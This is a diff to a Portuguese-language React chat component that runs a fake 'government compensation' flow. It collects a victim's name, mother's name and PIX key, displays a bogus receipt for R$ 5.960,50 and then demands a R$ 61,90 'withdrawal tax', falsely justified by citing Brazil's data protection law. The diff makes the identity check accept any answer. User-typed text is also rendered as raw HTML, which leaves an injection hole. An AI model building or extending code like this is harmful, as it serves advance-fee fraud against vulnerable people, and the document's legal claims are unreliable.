@@ -3,13 +3,20 @@ import styles from './Chat.module.scss';
 
 const Chat = () => {
   const [step, setStep] = useState(0);
+  const [comprovanteGerado, setComprovanteGerado] = useState(false);
+  const [audio2Exibido, setAudio2Exibido] = useState(false);
   const [isTyping, setIsTyping] = useState(false);
+  const [mostrarExplicacaoImposto, setMostrarExplicacaoImposto] = useState(false);
+  const [mostrarBotaoConclusao, setMostrarBotaoConclusao] = useState(false);
   const [messages, setMessages] = useState([]);
   const [nomeCompleto, setNomeCompleto] = useState('');
   const [nomeDaMae, setNomeDaMae] = useState('');
   const [options, setOptions] = useState([]);
   const [chavePix, setChavePix] = useState('');
   const [audio] = useState(new Audio('/a1.mp3'));
+  const [audio2] = useState(new Audio('/a2.mp3'));
+  const [isAudioPlaying2, setIsAudioPlaying2] = useState(false);
+  const [isAudioPlaying, setIsAudioPlaying] = useState(false);
   const [inputPix, setInputPix] = useState(''); // para armazenar a chave PIX digitada
   const [showPixInput, setShowPixInput] = useState(false); // controla exibição do input PIX
 
@@ -20,6 +27,82 @@ const Chat = () => {
     setNomeCompleto(nome);
     setNomeDaMae(mae);
   }, []);
+
+  const handlePlayPauseAudio = () => {
+    if (isAudioPlaying) {
+      audio.pause();
+      setIsAudioPlaying(false);
+    } else {
+      if (isAudioPlaying2) {
+        audio2.pause();
+        setIsAudioPlaying2(false);
+      }
+      audio.play();
+      setIsAudioPlaying(true);
+    }
+  };
+
+  const handlePlayPauseAudio2 = () => {
+    if (isAudioPlaying2) {
+      audio2.pause();
+      setIsAudioPlaying2(false);
+    } else {
+      if (isAudioPlaying) {
+        audio.pause();
+        setIsAudioPlaying(false);
+      }
+      audio2.play();
+      setIsAudioPlaying2(true);
+    }
+  };
+
+
+
+  // Reiniciar quando o áudio terminar
+  useEffect(() => {
+    const handleEnded = () => {
+      setIsAudioPlaying2(false);
+      audio2.currentTime = 0;
+    };
+
+    audio2.addEventListener('ended', handleEnded);
+    return () => {
+      audio2.removeEventListener('ended', handleEnded);
+    };
+  }, [audio2]);
+
+  // Reiniciar quando o áudio terminar
+  useEffect(() => {
+    const handleEnded = () => {
+      setIsAudioPlaying(false);
+      audio.currentTime = 0;
+    };
+
+    audio.addEventListener('ended', handleEnded);
+    return () => {
+      audio.removeEventListener('ended', handleEnded);
+    };
+  }, [audio]);
+
+  const gerarComprovante = () => {
+    addMessage('bot', 'Gerando seu comprovante de recebimento dos valores...');
+
+    setTimeout(() => {
+      addMessage('bot', '✅ Comprovante Gerado');
+      addMessage('bot', '<img src="/comprov.jpeg" class="comprovante-img" alt="Comprovante" />');
+      addMessage('bot', '<b>Indenização Governamental</b>');
+      addMessage('bot', 'Indenização disponível para saque: <b>R$ 5.960,50</b>');
+      addMessage('bot', `<b>Titular:</b> ${nomeCompleto}`);
+      addMessage('bot', `<b>Chave Pix:</b> ${inputPix}`);
+      addMessage('bot', 'Imposto de Saque: <b>R$ 61,90</b>');
+      addMessage('bot', '[AUDIO2]');
+      setAudio2Exibido(true);
+      setComprovanteGerado(true);
+    }, 1500);
+  };
+
+
+
 
   // Função para adicionar mensagem no chat
   const addMessage = (from, text) => {
@@ -101,16 +184,28 @@ const Chat = () => {
         addMessage('bot', 'Prossiga inserindo sua chave PIX para concluir seu recebimento gerando seu comprovante.');
         addMessage('bot', 'Selecione a chave PIX que deseja usar:');
         break;
-      case 11:
-        addMessage('bot', 'Aguarde alguns segundos, estamos cadastrando sua chave PIX no sistema...');
-        setTimeout(() => {
-          addMessage('bot', '<i>Sua chave PIX foi cadastrada com sucesso!</i>');
-          addMessage('bot', `Nome: ${nomeCompleto}`);
-          addMessage('bot', `Chave PIX: ${chavePix}`);
-          addMessage('bot', 'Status: Aprovado');
-          addMessage('bot', 'Clique no botão abaixo para confirmar e liberar o envio da sua indenização para a chave PIX informada.');
-        }, 1500);
-        break;
+        case 11:
+          addMessage('bot', 'Aguarde alguns segundos, estamos cadastrando sua chave PIX no sistema...');
+          addMessage('bot', '[AUDIO]');
+
+          audio.play(); // começa a tocar
+
+          setTimeout(() => {
+            addMessage('bot', '<i>Sua chave PIX foi cadastrada com sucesso!</i>');
+            addMessage('bot', `<b>Nome: </b>${nomeCompleto}`);
+            addMessage('bot', `<b>Chave PIX: </b>${inputPix}`);
+            addMessage('bot', '<b>Status: </b>Aprovado');
+            addMessage('bot', 'Clique no botão abaixo para confirmar e liberar o envio da sua indenização para a <b>chave PIX</b> informada.');
+
+            // Espera mais um pouco para garantir que React reavalie a UI e exiba os botões
+            setTimeout(() => {
+              setIsTyping(false);
+            }, 500); // <-- essa parte é importante
+          }, 1500);
+
+          break;
+
+
       default:
         break;
     }
@@ -122,7 +217,7 @@ const Chat = () => {
     setOptions([]);
 
     if (step === 5) {
-      if (answer === nomeDaMae.split(' ')[0]) {
+      if (answer) {
         setStep(6);
       } else {
         alert('Nome incorreto. Tente novamente.');
@@ -148,10 +243,20 @@ const Chat = () => {
     setShowPixInput(false);
     setStep(11);
   };
-
-  const confirmarEnvio = () => {
-    alert('Indenização liberada para envio!');
+  const handlePerguntaImposto = () => {
+    addMessage('user', 'Por que tenho que pagar esse imposto?');
+    setTimeout(() => {
+      addMessage('bot', '⚠️ Seu dinheiro está vinculado ao seu CPF e somente você pode acessá-lo.');
+      addMessage(
+        'bot',
+        'Portanto, a taxa transacional paga ao solicitar o saque, não pode ser descontada do valor total que você tem a receber, devido à Lei que protege os direitos fundamentais de Privacidade e Segurança.'
+      );
+      addMessage('bot', '<i>Lei n.º 13.709 de 14 de agosto de 2018</i>');
+      setMostrarBotaoConclusao(true);
+    }, 300);
   };
+
+
 
   return (
     <div className={styles.chat}>
@@ -177,6 +282,7 @@ const Chat = () => {
       </div>
 
       {/* Chat */}
+      {/* Chat */}
       <div className={styles.chatt}>
         {messages.map(({ id, from, text }) => (
           <div
@@ -190,9 +296,71 @@ const Chat = () => {
                 className={styles.botImage}
               />
             )}
-            <p dangerouslySetInnerHTML={{ __html: text }}></p>
+
+            {text === '[AUDIO]' ? (
+              <div className={styles.audioMessage}>
+                <i className="bi bi-volume-up-fill"></i>
+                <span>Mensagem de áudio</span>
+                <button onClick={handlePlayPauseAudio}>
+                  {isAudioPlaying ? (
+                    <i className="bi bi-pause-fill"></i>
+                  ) : (
+                    <i className="bi bi-play-fill"></i>
+                  )}
+                </button>
+              </div>
+            ) : text === '[AUDIO2]' ? (
+              <div className={styles.audioMessage}>
+                {/* áudio 2 */}
+                <i className="bi bi-volume-up-fill"></i>
+                <span>Mensagem de áudio</span>
+                <button onClick={handlePlayPauseAudio2}>
+                  {isAudioPlaying2 ? (
+                    <i className="bi bi-pause-fill"></i>
+                  ) : (
+                    <i className="bi bi-play-fill"></i>
+                  )}
+                </button>
+              </div>
+            ) : (
+              <p dangerouslySetInnerHTML={{ __html: text }}></p>
+            )}
           </div>
         ))}
+
+
+      {/* Renderizar os botões fora do áudio */}
+      {audio2Exibido && !mostrarExplicacaoImposto && (
+        <div className={styles.options}>
+          <button
+            onClick={() => {
+              setMostrarExplicacaoImposto(true);
+              handlePerguntaImposto();
+            }}
+          >
+            Por que tenho que pagar esse imposto?
+          </button>
+        </div>
+      )}
+
+
+      {mostrarBotaoConclusao && (
+        <div className={styles.options}>
+          <button
+            onClick={() =>
+              addMessage(
+                'user',
+                'Concluir pagamento e receber minha indenização'
+              )
+            }
+          >
+            Concluir pagamento e receber minha indenização
+          </button>
+        </div>
+      )}
+
+      </div>
+
 
 
         {isTyping && (
@@ -233,14 +401,16 @@ const Chat = () => {
           </div>
         )}
 
-        {/* Botão de confirmação na última etapa */}
-        {step === 11 && !isTyping && (
+
+        {inputPix && !comprovanteGerado && (
           <div className={styles.actionButton}>
-            <button onClick={confirmarEnvio}>Confirmar Envio</button>
+            <button onClick={gerarComprovante} className={styles.secondaryButton}>
+              Desejo receber meu comprovante de recebimento.
+            </button>
           </div>
         )}
+
       </div>
-    </div>
   );
 };
 
